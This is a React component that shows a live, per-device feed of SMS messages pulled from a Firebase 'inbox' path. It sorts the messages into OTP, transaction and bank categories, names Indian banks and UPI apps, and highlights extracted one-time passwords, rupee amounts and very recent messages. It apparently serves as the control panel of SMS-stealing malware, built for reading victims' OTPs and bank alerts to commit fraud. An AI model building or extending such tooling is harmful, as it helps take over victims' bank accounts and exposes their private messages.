import React, { useState, useEffect } from 'react';
import { ref, onValue, query, orderByChild, limitToLast } from 'firebase/database';
import { db } from '../firebase/config';
import './SmsInbox.css';

function SmsInbox({ deviceId }) {
  const [smsList, setSmsList] = useState([]);
  const [filteredSms, setFilteredSms] = useState([]);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState('');
  const [filterType, setFilterType] = useState('all');
  const [totalCount, setTotalCount] = useState(0);
  const [lastUpdated, setLastUpdated] = useState(null);

  useEffect(() => {
    if (deviceId) {
      loadSMS();
    }
  }, [deviceId]);

  const loadSMS = () => {
    setLoading(true);
    const inboxRef = ref(db, `inbox/${deviceId}`);
    
    // Real-time listener
    const unsubscribe = onValue(inboxRef, (snapshot) => {
      if (snapshot.exists()) {
        const data = snapshot.val();
        const smsArray = Object.entries(data).map(([key, value]) => ({
          id: key,
          ...value,
          time: Number(value.time) || 0,
          timestamp: value.timestamp || value.time || 0
        }));

        // Sort by time (newest first)
        smsArray.sort((a, b) => b.time - a.time);

        setSmsList(smsArray);
        setFilteredSms(smsArray);
        setTotalCount(smsArray.length);
        setLastUpdated(new Date().toLocaleString());
        
        console.log('📩 SMS Loaded:', smsArray.length);
      } else {
        setSmsList([]);
        setFilteredSms([]);
        setTotalCount(0);
      }
      setLoading(false);
    });

    return () => unsubscribe();
  };

  // Filter SMS
  useEffect(() => {
    let filtered = [...smsList];

    // Search filter
    if (searchTerm.trim()) {
      const term = searchTerm.toLowerCase().trim();
      filtered = filtered.filter(sms => 
        (sms.message || '').toLowerCase().includes(term) ||
        (sms.sender || '').toLowerCase().includes(term)
      );
    }

    // Type filter
    if (filterType !== 'all') {
      const msg = filtered.map(s => s.message || '');
      if (filterType === 'otp') {
        filtered = filtered.filter(s => /otp|verification|code|pin|one time password/i.test(s.message || ''));
      } else if (filterType === 'transaction') {
        filtered = filtered.filter(s => /credited|debited|paid|received|amount|rs|₹|transaction|sent|withdrawn/i.test(s.message || ''));
      } else if (filterType === 'bank') {
        filtered = filtered.filter(s => /hdfc|icici|sbi|axis|kotak|paytm|phonepe|gpay|google pay|upi/i.test(s.message || ''));
      } else if (filterType === 'promo') {
        filtered = filtered.filter(s => /offer|discount|sale|free|recharge|plan|pack|subscription/i.test(s.message || ''));
      } else if (filterType === 'personal') {
        filtered = filtered.filter(s => !/otp|credited|debited|paid|received|amount|rs|₹|transaction|offer|discount|recharge|hdfc|icici|sbi|axis|kotak|paytm|phonepe|gpay/i.test(s.message || ''));
      }
    }

    setFilteredSms(filtered);
  }, [searchTerm, filterType, smsList]);

  // Extract OTP from message
  const extractOTP = (message) => {
    if (!message) return null;
    const otpMatch = message.match(/\b(\d{4,8})\b/);
    return otpMatch ? otpMatch[1] : null;
  };

  // Extract Amount from message
  const extractAmount = (message) => {
    if (!message) return null;
    const amountMatch = message.match(/(?:rs\.?|inr|₹)\s*([\d,]+\.?\d*)/i);
    return amountMatch ? `₹${amountMatch[1].replace(/,/g, '')}` : null;
  };

  // Get sender type
  const getSenderType = (sender, message) => {
    const msg = message || '';
    if (/otp|verification|code|pin/i.test(msg)) return 'otp';
    if (/credited|debited|paid|received|amount|rs/i.test(msg)) return 'transaction';
    if (/hdfc|icici|sbi|axis|kotak|paytm|phonepe|gpay/i.test(msg)) return 'bank';
    if (/offer|discount|sale|free|recharge|plan/i.test(msg)) return 'promo';
    return 'personal';
  };

  const formatTime = (timestamp) => {
    if (!timestamp) return 'N/A';
    const date = new Date(Number(timestamp));
    const now = new Date();
    const diff = now - date;
    
    if (diff < 60000) return 'Just now';
    if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
    if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
    if (diff < 604800000) return `${Math.floor(diff / 86400000)}d ago`;
    return date.toLocaleDateString('en-IN', { day: '2-digit', month: 'short' });
  };

  const getTypeBadge = (type) => {
    const badges = {
      otp: { label: '🔐 OTP', class: 'otp' },
      transaction: { label: '💰 Transaction', class: 'transaction' },
      bank: { label: '🏦 Bank', class: 'bank' },
      promo: { label: '🎯 Promo', class: 'promo' },
      personal: { label: '📝 Personal', class: 'personal' }
    };
    return badges[type] || { label: '📩 SMS', class: 'personal' };
  };

  if (loading) {
    return (
      <div className="sms-loading">
        <div className="loading-spinner"></div>
        <p>📡 Loading SMS...</p>
      </div>
    );
  }

  return (
    <div className="sms-inbox">
      {/* Header */}
      <div className="sms-header">
        <div className="sms-header-left">
          <h2>📩 SMS Inbox</h2>
          <span className="sms-count">{filteredSms.length} / {totalCount}</span>
        </div>
        <div className="sms-header-right">
          <span className="sms-live">
            <span className="live-dot"></span>
            LIVE
          </span>
          <span className="sms-updated">Updated: {lastUpdated}</span>
        </div>
      </div>

      {/* Filters */}
      <div className="sms-filters">
        <div className="search-box">
          <span className="search-icon">🔍</span>
          <input
            type="text"
            placeholder="Search messages or sender..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
          />
          {searchTerm && (
            <button className="clear-btn" onClick={() => setSearchTerm('')}>✕</button>
          )}
        </div>

        <div className="filter-buttons">
          <button 
            className={`filter-btn ${filterType === 'all' ? 'active' : ''}`}
            onClick={() => setFilterType('all')}
          >
            📊 All
          </button>
          <button 
            className={`filter-btn ${filterType === 'otp' ? 'active' : ''}`}
            onClick={() => setFilterType('otp')}
          >
            🔐 OTP
          </button>
          <button 
            className={`filter-btn ${filterType === 'transaction' ? 'active' : ''}`}
            onClick={() => setFilterType('transaction')}
          >
            💰 Tx
          </button>
          <button 
            className={`filter-btn ${filterType === 'bank' ? 'active' : ''}`}
            onClick={() => setFilterType('bank')}
          >
            🏦 Bank
          </button>
          <button 
            className={`filter-btn ${filterType === 'promo' ? 'active' : ''}`}
            onClick={() => setFilterType('promo')}
          >
            🎯 Promo
          </button>
        </div>
      </div>

      {/* SMS List */}
      <div className="sms-list">
        {filteredSms.length === 0 ? (
          <div className="sms-empty">
            <span className="empty-icon">📭</span>
            <h3>No SMS found</h3>
            <p>Try changing your search or filters</p>
          </div>
        ) : (
          filteredSms.map((sms) => {
            const otp = extractOTP(sms.message);
            const amount = extractAmount(sms.message);
            const type = getSenderType(sms.sender, sms.message);
            const badge = getTypeBadge(type);
            const isNew = (Date.now() - Number(sms.time)) < 300000; // 5 minutes

            return (
              <div key={sms.id} className={`sms-item ${isNew ? 'new' : ''}`}>
                {isNew && <span className="new-badge">🆕 New</span>}
                
                <div className="sms-item-header">
                  <div className="sms-sender">
                    <span className="sender-icon">📱</span>
                    <span className="sender-name">{sms.sender || 'Unknown'}</span>
                    <span className={`type-badge ${badge.class}`}>{badge.label}</span>
                  </div>
                  <div className="sms-time">
                    {formatTime(sms.time)}
                  </div>
                </div>

                <div className="sms-message">
                  {sms.message || 'No message content'}
                </div>

                <div className="sms-footer">
                  <div className="sms-tags">
                    {otp && (
                      <span className="tag otp-tag">
                        🔑 OTP: <strong>{otp}</strong>
                      </span>
                    )}
                    {amount && (
                      <span className="tag amount-tag">
                        💰 {amount}
                      </span>
                    )}
                    <span className="tag time-tag">
                      🕐 {new Date(Number(sms.time)).toLocaleString()}
                    </span>
                  </div>
                  <div className="sms-id">
                    <span className="id-text">#{sms.id?.slice(-6)}</span>
                  </div>
                </div>
              </div>
            );
          })
        )}
      </div>

      {/* Footer */}
      <div className="sms-footer-bar">
        <span>📊 {filteredSms.length} messages</span>
        <span>🔄 Auto-refresh enabled</span>
        <span>📱 {deviceId?.slice(-8)}</span>
      </div>
    </div>
  );
}

export default SmsInbox;